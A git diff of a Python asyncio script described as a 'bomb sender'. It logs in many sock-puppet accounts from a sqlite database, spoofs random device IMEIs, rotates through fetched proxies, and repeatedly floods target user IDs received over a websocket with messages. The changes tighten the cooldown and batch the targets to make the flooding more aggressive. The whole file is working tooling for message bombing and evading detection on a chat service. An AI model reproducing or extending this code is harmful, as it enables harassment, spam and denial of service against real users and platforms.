@@ -19,8 +19,11 @@ from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, mak
 headers = {
     "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
 }
-pool = dict()
+pool = []
 # socket.socket = socks.socksocket
+
+online = set()
+attack_when = 20
 
 def get_proxies2():
     proxies = requests.get("https://proxy.ishield.cn/?types=0&count={}".format(300)).json()
@@ -78,8 +81,9 @@ async def ws_updater():
                                 await ws.close()
                                 break  # won't get here
                             else:
-                                # print('get data', msg.data)
-                                pool = json.loads(msg.data)
+                                #print('get data', msg.data)
+                                pool = list(json.loads(msg.data).keys())
+                                random.shuffle(pool)
                         elif msg.type == aiohttp.WSMsgType.ERROR:
                             raise StandardError(aiohttp.WSMsgType.ERROR)
             except aiohttp.client_exceptions.ClientConnectorError:
@@ -104,13 +108,14 @@ async def read_one(reader):
 
 async def one(loop, email, wait=0):
     """maintance one bomb sender"""
+    global online
     imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
     version = "1.7.61848"
     uid, token, session = None, None, None
-    if wait:
-        await asyncio.sleep(wait)
+    #if wait:
+    #    await asyncio.sleep(wait%10)
     while True:
-        # print("start:", email)
+        print("start:", email)
         try:
             if not uid or not token:
                 uid, token = await user_do(email, imei)
@@ -132,36 +137,42 @@ async def one(loop, email, wait=0):
             asyncio.ensure_future(heartbeat(writer), loop=loop)
             bomb_times = 0
             bomb_record = dict()
+            online.add(email)
+            writer.drain()
             while True:
                 i = 0
-                threshold = 15
-                for receiver, t in pool.items():
-                    now = time.time()
+                threshold = 10
+                targets = []
+                now = time.time()
+                for idx, receiver in enumerate(pool):
                     last_bomb_time = bomb_record.get(receiver, None)
-                    if last_bomb_time and now - last_bomb_time < threshold:
-                        # just bombed, skip this one
-                        # print("bombed !!!", now, last_bomb_time)
-                        continue
+                    if not last_bomb_time or now - last_bomb_time >= threshold:
+                        targets.append(receiver)
+                for receiver in targets[:4]:
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
                     i += 1
-                    await bomb_once(writer, receiver)
-                    await bomb_once(writer, receiver)
-                    await bomb_once(writer, receiver)
-                    await bomb_once(writer, receiver)
-                    await bomb_once(writer, receiver)
                     bomb_record[receiver] = now
                 # now everyone in pool has been bombed recently
                 #if i:
                 #    print(i, "in pool has been bombed. Total", len(pool))
                 await asyncio.sleep(1)
+            await asyncio.sleep(1)
         except BrokenPipeError:
+            if email in online:
+                online.remove(email)
             import traceback
             print(traceback.format_exc())
             print(email, "disconnected after", i, "turns")
         except:
+            if email in online:
+                online.remove(email)
             import traceback
             print("wtf!!!!", traceback.format_exc())
-            await asyncio.sleep(5)
-            continue
+            await asyncio.sleep(3)
 
 
 async def bomb_once(writer, target_id):
@@ -179,17 +190,20 @@ async def count_down(sec):
     exit()
 
 if __name__ == "__main__":
+    import sys
+    x = int(sys.argv[1])
+    count = 30
     loop = asyncio.get_event_loop()
     guards = []
     conn = sqlite3.connect("data.db")
     conn.isolation_level = None   # auto commit
     c = conn.cursor()
-    c.execute("SELECT * FROM guards WHERE length(name)==3 ORDER BY RANDOM() LIMIT 36")
+    c.execute("SELECT * FROM guards WHERE length(name)<=3 order by rowid LIMIT ?,?", ((x-1)*count, count))
     idx = 0
     for row in c.fetchall():
         idx += 1
         email = row[0]
-        guards.append(one(loop, email, idx%6))
+        guards.append(one(loop, email, idx))
     guards += [ws_updater()]
     loop.run_until_complete(asyncio.gather(*guards))
     loop.close()
